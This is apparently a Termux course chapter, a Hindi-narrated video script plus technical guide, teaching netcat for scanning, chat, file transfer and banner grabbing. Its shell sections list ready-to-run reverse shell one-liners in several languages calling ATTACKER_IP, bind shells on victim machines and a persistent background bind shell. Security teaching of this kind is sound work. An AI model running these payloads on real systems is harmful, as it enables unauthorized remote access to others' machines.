# Chapter 27: Netcat (nc) Mastery

> **Module:** 5 - Networking  
> **Chapter:** 27 of 61  
> **Duration:** 20-25 Minutes  
> **Difficulty:** ⭐⭐⭐ Intermediate  

---

## 📋 Chapter Overview

| Section | Content |
|---------|---------|
| Video Script | Complete Hindi narration with timestamps |
| Technical Guide | Netcat installation, flags, advanced techniques |
| Practical Examples | 30+ real-world nc commands |
| Commands Reference | All netcat flags and options |
| Practice Exercises | Hands-on networking tasks |
| Troubleshooting | Common netcat errors and fixes |
| Video Assets | Thumbnail, description, tags |

---

## 🎬 VIDEO SCRIPT (Complete Hindi Narration)

```
═══════════════════════════════════════════════════════════════════════════════
TERMUX FULL COURSE - CHAPTER 27
Title: Netcat (nc) Mastery | Swiss Army Knife of Networking | T3rmuxk1ng
Duration: 20-25 Minutes
═══════════════════════════════════════════════════════════════════════════════

[INTRO - 0:00 to 0:50]
─────────────────────────────────────────────────────────────────────────────

Namaskar Dosto! Welcome back to Termux Full Course!

Aaj hum seekhenge networking ki sabse powerful tool - Netcat! 

Netcat ko "Swiss Army Knife of Networking" kaha jaata hai. Ye itni 
versatile tool hai ki isko seekhne ke baad aap network pe almost 
kuch bhi kar sakte ho - chatting, file transfer, port scanning, 
backdoors, reverse shells - sab kuch!

Penetration testers, network administrators, hackers - sab use 
karte hain. Agar aap cybersecurity mein jaana chahte ho, to 
Netcat aani chahiye.

To chaliye shuru karte hain Netcat Mastery!

Play button dabaiye, video like karein, aur channel subscribe 
karein!

---

[SECTION 1: NETCAT INTRODUCTION - 0:50 to 3:30]
─────────────────────────────────────────────────────────────────────────────

Sabse pehle sawal - Netcat kya hai?

Netcat ek command-line networking utility hai jo TCP aur UDP 
connections create, read, aur write karti hai. Iska command 
hai "nc" - short for Netcat.

Netcat ka simple concept:
- Read data from network
- Write data to network
- Connect to ports
- Listen on ports

Basic syntax:

    nc [options] [host] [port]

Example - Google ke saath connection:

    nc google.com 80

Ye command Google ke port 80 pe connect karegi. Ab aap type 
kar sakte ho HTTP commands.

┌─────────────────────────────────────────────────────────────────────────┐
│                    NETCAPABILITIES                                       │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ✅ Port Scanning        - Open ports dhundhna                          │
│  ✅ Chat Server          - Two-way communication                        │
│  ✅ File Transfer        - Files bhejna aur receive karna               │
│  ✅ Banner Grabbing      - Service information lana                     │
│  ✅ Reverse Shells       - Remote access (educational)                  │
│  ✅ Bind Shells          - Listener setup (educational)                 │
│  ✅ Port Forwarding      - Traffic redirect karna                       │
│  ✅ Data Streaming       - Raw data transfer                            │
│  ✅ Debugging            - Network troubleshooting                      │
│  ✅ Backdoors            - Persistent access (ethical only)             │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

Netcat itna powerful hai ki iska use:
- Hackers penetration testing ke liye karte hain
- Admins network debugging ke liye karte hain
- Developers testing ke liye karte hain
- Students learning ke liye karte hain

---

[SECTION 2: NETCAT INSTALLATION - 3:30 to 5:30]
─────────────────────────────────────────────────────────────────────────────

Chaliye Netcat install karte hain Termux mein.

[SCREEN: Termux Terminal]

Pehle package update:

    pkg update && pkg upgrade -y

Netcat install:

    pkg install netcat -y

Ye command install karega:
- nc command
- ncat (Nmap's enhanced version)

Verify installation:

    nc -h

Ya:

    which nc

Output: /data/data/com.termux/files/usr/bin/nc

Alternative - ncat bhi install kar sakte ho:

    pkg install ncat -y

ncat Nmap ka enhanced version hai, more features ke saath.

Check versions:

    nc --version 2>&1 || echo "Netcat installed"
    ncat --version

┌─────────────────────────────────────────────────────────────────────────┐
│                    NETCAT FLAVORS                                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. Traditional Netcat (nc)                                             │
│     - Original implementation                                            │
│     - Basic features                                                     │
│     - Most compatible                                                    │
│                                                                          │
│  2. OpenBSD Netcat                                                       │
│     - Security focused                                                   │
│     - No -e flag (security reason)                                       │
│     - More secure default options                                        │
│                                                                          │
│  3. Ncat (Nmap's Netcat)                                                 │
│     - Enhanced features                                                  │
│     - SSL/TLS support                                                    │
│     - Proxy support                                                      │
│     - More connection options                                            │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

---

[SECTION 3: NETCAT FLAGS EXPLAINED - 5:30 to 9:00]
─────────────────────────────────────────────────────────────────────────────

Ab Netcat ke important flags samjhte hain.

┌─────────────────────────────────────────────────────────────────────────┐
│                    IMPORTANT NETCAT FLAGS                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  -l    Listen Mode                                                       │
│  ────────────────────                                                    │
│  Server mode mein run karta hai. Port pe listen karta hai.              │
│  Example: nc -l -p 4444                                                 │
│                                                                          │
│  -p    Port Specification                                                │
│  ───────────────────────────                                             │
│  Port number specify karta hai.                                         │
│  Example: nc -l -p 4444 (listen on port 4444)                           │
│                                                                          │
│  -v    Verbose Mode                                                      │
│  ──────────────────                                                      │
│  Detailed output deta hai. Connection status dikhaata hai.              │
│  Example: nc -v google.com 80                                           │
│                                                                          │
│  -vv   More Verbose                                                      │
│  ──────────────────                                                      │
│  Even more detailed output. Debugging ke liye useful.                   │
│  Example: nc -vv google.com 80                                          │
│                                                                          │
│  -z    Zero I/O Mode (Scan Mode)                                        │
│  ──────────────────────────────                                         │
│  Data bhejne ke bina scan karta hai. Port scanning ke liye.            │
│  Example: nc -zv 192.168.1.1 1-1000                                    │
│                                                                          │
│  -e    Execute Program                                                   │
│  ────────────────────                                                    │
│  Connection pe program execute karta hai. Shells ke liye use hota hai.  │
│  Example: nc -l -p 4444 -e /bin/bash (NOT in all versions)             │
│                                                                          │
│  -u    UDP Mode                                                          │
│  ──────────────                                                          │
│  TCP ke bajaye UDP use karta hai.                                       │
│  Example: nc -u 192.168.1.1 53                                         │
│                                                                          │
│  -n    No DNS Resolution                                                 │
│  ──────────────────────                                                  │
│  DNS lookup nahi karta. IP address use karta hai.                       │
│  Example: nc -n 192.168.1.1 80                                         │
│                                                                          │
│  -w    Timeout                                                           │
│  ──────────                                                              │
│  Connection timeout in seconds.                                         │
│  Example: nc -w 5 192.168.1.1 80                                       │
│                                                                          │
│  -k    Keep Open (ncat)                                                  │
│  ──────────────────                                                      │
│  Connection close hone ke baad bhi listen continue rakhta hai.         │
│  Example: ncat -l -k -p 4444                                           │
│                                                                          │
│  -s    Source Address                                                    │
│  ─────────────────                                                       │
│  Specific source IP se connect karta hai.                               │
│  Example: nc -s 192.168.1.100 192.168.1.1 80                           │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

[FLAG COMBINATIONS]

Common combinations:

    nc -lvp 4444
    # -l = listen
    # -v = verbose
    # -p = port

    nc -zvn 192.168.1.1 1-100
    # -z = scan mode
    # -v = verbose
    # -n = no DNS

    ncat -lvkp 4444
    # -k = keep open (ncat only)

---

[SECTION 4: PORT SCANNING WITH NC - 9:00 to 12:00]
─────────────────────────────────────────────────────────────────────────────

Ab dekhte hain Netcat se port scanning kaise karte hain.

[SINGLE PORT SCAN]

    nc -zv <target> <port>

Example:

    nc -zv 192.168.1.1 80

Output:
    Connection to 192.168.1.1 80 port [tcp/http] succeeded!

Agar port open nahi hai:
    nc: connect to 192.168.1.1 port 80 (tcp) failed: Connection refused

[MULTIPLE PORT SCAN]

    nc -zv <target> <start-port>-<end-port>

Example - Scan ports 1 to 100:

    nc -zv 192.168.1.1 1-100

Example - Scan common ports:

    nc -zv 192.168.1.1 20-23,80,443,8080

[COMMON PORTS TO SCAN]

┌─────────────────────────────────────────────────────────────────────────┐
│                    COMMON NETWORK PORTS                                  │
├─────────────┬───────────────────┬───────────────────────────────────────┤
│ Port        │ Service           │ Description                           │
├─────────────┼───────────────────┼───────────────────────────────────────┤
│ 20, 21      │ FTP               │ File Transfer Protocol                │
│ 22          │ SSH               │ Secure Shell                          │
│ 23          │ Telnet            │ Remote Terminal                       │
│ 25          │ SMTP              │ Mail Server                           │
│ 53          │ DNS               │ Domain Name System                    │
│ 80          │ HTTP              │ Web Server                            │
│ 110         │ POP3              │ Email Protocol                        │
│ 139, 445    │ SMB               │ Windows File Sharing                  │
│ 143, 993    │ IMAP              │ Email Protocol                        │
│ 443         │ HTTPS             │ Secure Web                            │
│ 445         │ SMB               │ Windows Sharing                       │
│ 3306        │ MySQL             │ Database                              │
│ 3389        │ RDP               │ Remote Desktop                        │
│ 5432        │ PostgreSQL        │ Database                              │
│ 5900        │ VNC               │ Remote Desktop                        │
│ 6379        │ Redis             │ Database                              │
│ 8080        │ HTTP Proxy        │ Web Server Alt                        │
│ 8443        │ HTTPS Alt         │ Secure Web Alt                        │
└─────────────┴───────────────────┴───────────────────────────────────────┘

[UDP SCAN]

    nc -zuv <target> <port>

Example:

    nc -zuv 192.168.1.1 53

[FAST SCAN SCRIPT]

Scan with timeout for speed:

    nc -zvn -w 1 192.168.1.1 1-1000

-w 1 means 1 second timeout per port.

---

[SECTION 5: CHAT SERVER - TWO-WAY COMMUNICATION - 12:00 to 15:00]
─────────────────────────────────────────────────────────────────────────────

Ab ek interesting application - Chat Server!

Netcat se aap simple chat server bana sakte ho. Do devices 
between communication ke liye.

[SERVER SIDE]

Device 1 pe (jo listen karega):

    nc -lvp 4444

Ya with ncat (more reliable):

    ncat -lvp 4444

Ab ye device port 4444 pe listen kar raha hai.

[CLIENT SIDE]

Device 2 pe (jo connect karega):

    nc <server-ip> 4444

Example:

    nc 192.168.1.100 4444

[DEMONSTRATION]

Server:
    $ nc -lvp 4444
    listening on [any] 4444 ...
    connect to [192.168.1.100] from (UNKNOWN) [192.168.1.101] 45678
    Hello from client!
    Hi from server!
    
Client:
    $ nc 192.168.1.100 4444
    Hello from client!
    Hi from server!

[KEEP CONNECTION OPEN]

ncat mein -k flag se multiple connections allow hoti hain:

    ncat -lkvp 4444

---

[SECTION 6: FILE TRANSFER - 15:00 to 17:30]
─────────────────────────────────────────────────────────────────────────────

Netcat se files transfer karna bahut easy hai!

[SENDING FILE - RECEIVER SIDE]

Pehle receiver listen karega:

    nc -lvp 4444 > received_file.txt

Ya progress ke saath:

    nc -lvp 4444 > received_file.txt

[SENDING FILE - SENDER SIDE]

Sender file bhejega:

    nc <receiver-ip> 4444 < file_to_send.txt

Example:

    nc 192.168.1.100 4444 < secret.txt

[SENDING LARGE FILES]

Large files ke liye pv (pipe viewer) use karein:

    pkg install pv

Sender:

    pv large_file.mp4 | nc 192.168.1.100 4444

Receiver:

    nc -lvp 4444 > large_file.mp4

[COMPRESSED TRANSFER]

Compress aur bhejo:

Sender (compress and send):
    tar czf - /path/to/folder | nc 192.168.1.100 4444

Receiver (receive and extract):
    nc -lvp 4444 | tar xzf -

[ENCRYPTED TRANSFER]

Encryption ke saath:

    pkg install openssl

Sender:
    openssl enc -aes-256-cbc -salt -in file.txt | nc 192.168.1.100 4444

Receiver:
    nc -lvp 4444 | openssl enc -aes-256-cbc -d -out file.txt

---

[SECTION 7: BANNER GRABBING - 17:30 to 19:00]
─────────────────────────────────────────────────────────────────────────────

Banner grabbing se aap service ka version aur information 
nikal sakte ho.

[SIMPLE BANNER GRAB]

    nc <target> <port>

Example - HTTP banner:

    nc google.com 80
    HEAD / HTTP/1.0
    [Press Enter twice]

Output:
    HTTP/1.1 200 OK
    Date: Mon, 01 Jan 2024 12:00:00 GMT
    Server: gws
    Content-Type: text/html

[SSH BANNER]

    nc 192.168.1.1 22

Output:
    SSH-2.0-OpenSSH_8.9p1 Ubuntu-3

[SMTP BANNER]

    nc mail.server.com 25

Output:
    220 mail.server.com ESMTP Postfix

[FTP BANNER]

    nc 192.168.1.1 21

Output:
    220 ProFTPD 1.3.7 Server ready.

[AUTOMATED BANNER GRAB]

    echo "" | nc -v -w 2 192.168.1.1 80

---

[SECTION 8: REVERSE SHELL BASICS - 19:00 to 22:00]
─────────────────────────────────────────────────────────────────────────────

⚠️ DISCLAIMER: Ye sirf educational purpose ke liye hai. Unauthorized 
access illegal hai. Sirf apne systems pe practice karein.

[WHAT IS REVERSE SHELL?]

Reverse shell mein victim ka system YOUR system pe connect karta hai.
Ye firewall bypass kar sakta hai kyunki connection outbound hai.

[ATTACKER MACHINE - LISTENER]

Apne machine pe listen karein:

    nc -lvp 4444

[VICTIM MACHINE - CONNECT BACK]

Victim machine ye command run karegi:

Bash reverse shell:
    bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

Python reverse shell:
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

PHP reverse shell:
    php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

Perl reverse shell:
    perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

[WITH NETCAT -e FLAG]

Agar -e flag available hai:

Victim:
    nc ATTACKER_IP 4444 -e /bin/bash

OpenBSD version mein -e flag nahi hota. Use ncat:

    ncat ATTACKER_IP 4444 -e /bin/bash

[SECURING REVERSE SHELL]

Ncat with SSL:

Listener:
    ncat --ssl -lvp 4444

Connect:
    ncat --ssl ATTACKER_IP 4444 -e /bin/bash

---

[SECTION 9: BIND SHELL BASICS - 22:00 to 24:00]
─────────────────────────────────────────────────────────────────────────────

Bind shell mein attacker TARGET pe connect karta hai.

[VICTIM MACHINE - LISTEN WITH SHELL]

Victim apne port pe shell bind karega:

    nc -lvp 4444 -e /bin/bash

Ya with ncat:

    ncat -lvp 4444 -e /bin/bash

[ATTACKER MACHINE - CONNECT]

Attacker connect karega:

    nc VICTIM_IP 4444

[WINDOWS BIND SHELL]

Windows pe:

    nc -lvp 4444 -e cmd.exe

[DIFFERENCE - REVERSE VS BIND]

┌─────────────────────────────────────────────────────────────────────────┐
│                    REVERSE SHELL VS BIND SHELL                           │
├─────────────────────────┬───────────────────────────────────────────────┤
│ Reverse Shell           │ Bind Shell                                    │
├─────────────────────────┼───────────────────────────────────────────────┤
│ Victim connects to you  │ You connect to victim                         │
│ Outbound connection     │ Inbound connection                            │
│ Bypasses firewall       │ Firewall may block                            │
│ Attacker = Listener     │ Victim = Listener                             │
│ More common in practice │ Less common due to firewall                   │
└─────────────────────────┴───────────────────────────────────────────────┘

---

[SECTION 10: NETCAT ALTERNATIVES - 24:00 to 26:00]
─────────────────────────────────────────────────────────────────────────────

Netcat ke alternatives bhi available hain:

[NCAT - NMAP'S NETCAT]

Enhanced features:
    - SSL/TLS encryption
    - Proxy support
    - More reliable
    - Broader platform support

Install:
    pkg install ncat

Usage:
    ncat -lvp 4444 --ssl

[SOCAT - ADVANCED NETWORKING TOOL]

More powerful than netcat:

Install:
    pkg install socat

Examples:
    # Listen on port
    socat TCP-LISTEN:4444,fork -

    # Connect to port
    socat TCP:192.168.1.1:4444 -

    # SSL connection
    socat OPENSSL:192.168.1.1:4443 -

    # File transfer
    socat TCP-LISTEN:4444,fork OPEN:file.txt

[CRIPTCAT - ENCRYPTED NETCAT]

Install:
    pip install cryptcat

Usage with encryption:
    cryptcat -lvp 4444 -k password

[COMPARISON TABLE]

┌─────────────────────────────────────────────────────────────────────────┐
│                    NETCAT ALTERNATIVES COMPARISON                        │
├──────────────┬──────────────┬──────────────┬───────────────────────────┤
│ Feature      │ nc           │ ncat         │ socat                     │
├──────────────┼──────────────┼──────────────┼───────────────────────────┤
│ Basic conn   │ ✅           │ ✅           │ ✅                        │
│ Port scan    │ ✅           │ ✅           │ ✅                        │
│ SSL/TLS      │ ❌           │ ✅           │ ✅                        │
│ Proxy        │ ❌           │ ✅           │ ✅                        │
│ IPv6         │ ✅           │ ✅           │ ✅                        │
│ Multi conn   │ ❌           │ ✅ (-k)      │ ✅ (fork)                 │
│ Complex I/O  │ Limited      │ Limited      │ ✅ Advanced               │
│ Learning     │ Easy         │ Easy         │ Moderate                  │
└──────────────┴──────────────┴──────────────┴───────────────────────────┘

---

[SECTION 11: SUMMARY & NEXT PREVIEW - 26:00 to 28:00]
─────────────────────────────────────────────────────────────────────────────

To dosto, Netcat Mastery chapter complete! Let's summarize:

✅ Netcat kya hai - Swiss Army Knife of Networking
✅ Installation - pkg install netcat
✅ Important flags - -l, -p, -v, -vv, -z, -e, -u, -n, -w, -k
✅ Port scanning - nc -zv target ports
✅ Chat server - Two-way communication
✅ File transfer - Send and receive files
✅ Banner grabbing - Service information
✅ Reverse shells - Educational concepts
✅ Bind shells - Educational concepts
✅ Alternatives - ncat, socat

[IMPORTANT COMMANDS]

┌─────────────────────────────────────────────────────────────────────────┐
│                    NETCAT QUICK REFERENCE                                │
├─────────────────────────────────────────────────────────────────────────┤
│ nc -lvp 4444                   │ Listen on port 4444                    │
│ nc 192.168.1.1 80              │ Connect to port 80                     │
│ nc -zv 192.168.1.1 1-100       │ Port scan 1-100                        │
│ nc -lvp 4444 > file.txt        │ Receive file                           │
│ nc 192.168.1.1 4444 < file.txt │ Send file                              │
│ nc -u 192.168.1.1 53           │ UDP connection                         │
│ ncat --ssl -lvp 4444           │ SSL listener                           │
└─────────────────────────────────────────────────────────────────────────┘

Next Chapter 28 mein hum seekhenge:
- HTTP tools in Termux
- curl command mastery
- wget for downloads
- HTTP requests
- API testing with curl

Agar ye video helpful lagi, to:
👍 Like button press karein
🔔 Subscribe karein, notification bell on karein
💬 Koi sawal ho to comment mein poochein
📤 Share karein friends ke saath

Main har comment ka reply karta hoon.

Thank you for watching! See you in Chapter 28!

═══════════════════════════════════════════════════════════════════════════════
```

---

## 📖 TECHNICAL GUIDE

### 1. Netcat Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    NETCAT OPERATION MODES                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  CLIENT MODE (Connect)                                                   │
│  ─────────────────────                                                   │
│  ┌─────────┐         ┌─────────┐                                        │
│  │  nc     │ ───────▶│ Target  │                                        │
│  │ client  │  TCP/UDP │ Server  │                                        │
│  └─────────┘         └─────────┘                                        │
│                                                                          │
│  Command: nc <host> <port>                                              │
│                                                                          │
│  ────────────────────────────────────────────────────────────────────   │
│                                                                          │
│  SERVER MODE (Listen)                                                    │
│  ─────────────────────                                                   │
│  ┌─────────┐         ┌─────────┐                                        │
│  │  nc     │ ◀───────│ Client  │                                        │
│  │ server  │  TCP/UDP │ Machine │                                        │
│  └─────────┘         └─────────┘                                        │
│                                                                          │
│  Command: nc -l -p <port>                                               │
│                                                                          │
│  ────────────────────────────────────────────────────────────────────   │
│                                                                          │
│  SCAN MODE (Zero I/O)                                                    │
│  ─────────────────────                                                   │
│  ┌─────────┐         ┌─────────┐                                        │
│  │  nc     │ ──?──?──│ Target  │                                        │
│  │ scanner │  probe  │ Ports   │                                        │
│  └─────────┘         └─────────┘                                        │
│                                                                          │
│  Command: nc -zv <host> <ports>                                         │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 2. Netcat Flags Complete Reference

| Flag | Description | Example |
|------|-------------|---------|
| `-l` | Listen mode | `nc -l -p 4444` |
| `-p` | Specify port | `nc -l -p 4444` |
| `-v` | Verbose output | `nc -v google.com 80` |
| `-vv` | More verbose | `nc -vv google.com 80` |
| `-z` | Zero I/O (scan mode) | `nc -zv 192.168.1.1 1-100` |
| `-e` | Execute program | `nc -l -p 4444 -e /bin/bash` |
| `-u` | UDP mode | `nc -u 192.168.1.1 53` |
| `-n` | No DNS resolution | `nc -n 192.168.1.1 80` |
| `-w` | Timeout (seconds) | `nc -w 5 192.168.1.1 80` |
| `-k` | Keep open (ncat) | `ncat -l -k -p 4444` |
| `-s` | Source address | `nc -s 192.168.1.100 192.168.1.1 80` |
| `-r` | Randomize ports | `nc -r 192.168.1.1 1-100` |
| `-i` | Interval (seconds) | `nc -i 5 -l -p 4444` |
| `-q` | Quit after EOF | `nc -q 1 192.168.1.1 80` |
| `-4` | IPv4 only | `nc -4 google.com 80` |
| `-6` | IPv6 only | `nc -6 google.com 80` |
| `-b` | Allow broadcast | `nc -b -u 255.255.255.255 4444` |

### 3. Ncat-Specific Flags

| Flag | Description | Example |
|------|-------------|---------|
| `--ssl` | SSL connection | `ncat --ssl -l -p 4444` |
| `--ssl-verify` | Verify SSL cert | `ncat --ssl-verify target.com 443` |
| `--proxy` | Use proxy | `ncat --proxy proxy.com:8080 target.com 80` |
| `--proxy-type` | Proxy type | `ncat --proxy-type socks5 --proxy ...` |
| `--proxy-auth` | Proxy credentials | `ncat --proxy-auth user:pass ...` |
| `-k` | Keep open | `ncat -l -k -p 4444` |
| `--allow` | Allow specific hosts | `ncat -l --allow 192.168.1.100` |
| `--deny` | Deny specific hosts | `ncat -l --deny 192.168.1.100` |
| `--max-conns` | Max connections | `ncat -l --max-conns 10` |
| `-C` | CRLF mode | `ncat -C target.com 80` |

### 4. Port Scanning Techniques

```bash
# TCP Connect Scan
nc -zv 192.168.1.1 1-1000

# UDP Scan
nc -zuv 192.168.1.1 1-100

# Fast Scan with Timeout
nc -zvn -w 1 192.168.1.1 1-65535

# Specific Ports
nc -zv 192.168.1.1 22,80,443,3306,8080

# Common Ports Scan
nc -zv 192.168.1.1 20,21,22,23,25,53,80,110,139,443,445,3306,3389,5432,8080

# Scan with Banner Grab
for port in 22 80 443; do
    echo "Port $port:"
    echo "" | nc -v -w 2 192.168.1.1 $port
done

# Scan Multiple Hosts
for ip in 192.168.1.{1..254}; do
    nc -zvn -w 1 $ip 80 2>&1 | grep succeeded &
done
```

### 5. File Transfer Methods

```bash
# Simple File Transfer
# Receiver
nc -lvp 4444 > received_file.txt

# Sender
nc 192.168.1.100 4444 < file.txt

# With Progress (pv)
# Sender
pv large_file.iso | nc 192.168.1.100 4444

# Receiver
nc -lvp 4444 > large_file.iso

# Compressed Transfer
# Sender
tar czf - /path/to/directory | nc 192.168.1.100 4444

# Receiver
nc -lvp 4444 | tar xzf -

# Encrypted Transfer (OpenSSL)
# Sender
openssl enc -aes-256-cbc -salt -in secret.txt | nc 192.168.1.100 4444

# Receiver
nc -lvp 4444 | openssl enc -aes-256-cbc -d -out secret.txt

# Directory Transfer with tar
# Sender
tar cf - /path/to/dir | nc 192.168.1.100 4444

# Receiver
nc -lvp 4444 | tar xf -

# Compressed + Encrypted
# Sender
tar czf - secret_dir/ | openssl enc -aes-256-cbc -salt | nc 192.168.1.100 4444

# Receiver
nc -lvp 4444 | openssl enc -aes-256-cbc -d | tar xzf -
```

### 6. Reverse Shell Payloads

```bash
# BASH REVERSE SHELL
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Alternative Bash
exec 5<>/dev/tcp/ATTACKER_IP/4444;cat <&5 | while read line; do $line 2>&5 >&5; done

# BASH WITH NETCAT
nc ATTACKER_IP 4444 -e /bin/bash

# NCAT WITH SSL
ncat --ssl ATTACKER_IP 4444 -e /bin/bash

# PYTHON REVERSE SHELL
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PYTHON3 REVERSE SHELL
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP REVERSE SHELL
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PERL REVERSE SHELL
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# RUBY REVERSE SHELL
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# JAVA REVERSE SHELL
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();

# POWERSHELL REVERSE SHELL (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### 7. Bind Shell Setup

```bash
# LINUX BIND SHELL
# On victim (listen)
nc -lvp 4444 -e /bin/bash

# On attacker (connect)
nc VICTIM_IP 4444

# WINDOWS BIND SHELL
# On victim
nc -lvp 4444 -e cmd.exe

# NCAT BIND WITH SSL
# On victim
ncat --ssl -lvp 4444 -e /bin/bash

# On attacker
ncat --ssl VICTIM_IP 4444

# PERSISTENT BIND SHELL (Background)
# On victim
nohup nc -lvp 4444 -e /bin/bash &

# SOCAT BIND SHELL
# On victim
socat TCP-LISTEN:4444,fork EXEC:/bin/bash

# On attacker
socat TCP:VICTIM_IP:4444 -
```

### 8. Socat vs Netcat

```bash
# NETCAT EQUIVALENTS IN SOCAT

# nc -lvp 4444
socat TCP-LISTEN:4444,reuseaddr,fork -

# nc 192.168.1.1 4444
socat TCP:192.168.1.1:4444 -

# nc -lvp 4444 -e /bin/bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# File transfer receive
socat TCP-LISTEN:4444,reuseaddr OPEN:received.txt,creat

# File transfer send
socat OPEN:file.txt TCP:192.168.1.100:4444

# SSL listener
socat OPENSSL-LISTEN:4444,cert=server.pem,fork -

# SSL connection
socat - OPENSSL:192.168.1.1:4444

# UDP listener
socat UDP-LISTEN:4444,reuseaddr,fork -

# UDP connection
socat - UDP:192.168.1.1:4444

# Port forwarding
socat TCP-LISTEN:8080,fork TCP:192.168.1.1:80
```

---

## 📋 30+ PRACTICAL NETCAT EXAMPLES

### Basic Connection Examples

```bash
# 1. Connect to a web server
nc google.com 80

# 2. Connect with verbose output
nc -v google.com 80

# 3. Connect with more verbose
nc -vv google.com 80

# 4. Connect with timeout
nc -w 5 google.com 80

# 5. Connect without DNS resolution
nc -n 142.250.195.46 80

# 6. UDP connection
nc -u 192.168.1.1 53

# 7. IPv4 only
nc -4 google.com 80

# 8. IPv6 only
nc -6 google.com 80
```

### Listener Examples

```bash
# 9. Basic listener
nc -lvp 4444

# 10. Listener with specific port
nc -l -p 8080

# 11. Listener that stays open (ncat)
ncat -l -k -p 4444

# 12. UDP listener
nc -luvp 4444

# 13. Listener with timeout
nc -lvp 4444 -w 60

# 14. SSL listener (ncat)
ncat --ssl -lvp 4444
```

### Port Scanning Examples

```bash
# 15. Single port scan
nc -zv 192.168.1.1 80

# 16. Port range scan
nc -zv 192.168.1.1 1-1000

# 17. Fast scan with timeout
nc -zvn -w 1 192.168.1.1 1-10000

# 18. Specific ports scan
nc -zv 192.168.1.1 22,80,443,3306,8080

# 19. UDP scan
nc -zuv 192.168.1.1 53

# 20. Scan common ports
nc -zv 192.168.1.1 20,21,22,23,25,53,80,110,139,443,445,3306,3389

# 21. Scan with no DNS (faster)
nc -zvn 192.168.1.1 1-1000
```

### Chat & Communication Examples

```bash
# 22. Start chat server
nc -lvp 4444

# 23. Connect to chat server
nc 192.168.1.100 4444

# 24. Persistent chat server
ncat -lkvp 4444

# 25. Chat with SSL
ncat --ssl -lvp 4444
```

### File Transfer Examples

```bash
# 26. Receive file
nc -lvp 4444 > received.txt

# 27. Send file
nc 192.168.1.100 4444 < file.txt

# 28. Send with progress
pv large_file.iso | nc 192.168.1.100 4444

# 29. Compressed directory transfer
tar czf - /path/to/dir | nc 192.168.1.100 4444

# 30. Receive and extract
nc -lvp 4444 | tar xzf -

# 31. Encrypted file transfer
openssl enc -aes-256-cbc -salt -in secret.txt | nc 192.168.1.100 4444

# 32. Receive encrypted
nc -lvp 4444 | openssl enc -aes-256-cbc -d -out secret.txt
```

### Banner Grabbing Examples

```bash
# 33. HTTP banner
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc google.com 80

# 34. SSH banner
nc 192.168.1.1 22

# 35. FTP banner
nc 192.168.1.1 21

# 36. SMTP banner
nc mail.server.com 25

# 37. Quick banner grab
echo "" | nc -v -w 2 192.168.1.1 80
```

### Advanced Examples

```bash
# 38. HTTP GET request
echo -e "GET / HTTP/1.1\r\nHost: google.com\r\n\r\n" | nc google.com 80

# 39. Proxy through netcat
nc -X 5 -x proxy.com:1080 target.com 80

# 40. Create simple HTTP server
while true; do nc -lvp 8080 -c 'echo -e "HTTP/1.1 200 OK\r\n\r\nHello World"'; done

# 41. Clone a disk over network
# Sender
dd if=/dev/sda | nc 192.168.1.100 4444

# Receiver
nc -lvp 4444 | dd of=/dev/sdb

# 42. Port forwarding
# On middle machine
nc -lvp 8080 -c "nc target.com 80"

# 43. Simple load balancer
while true; do nc -lvp 80 -c "nc backend1 80 || nc backend2 80"; done

# 44. Capture network traffic to file
nc -lvp 4444 >> capture.log

# 45. Remote command execution
nc -lvp 4444 -e /bin/bash

# 46. Interactive shell with ncat
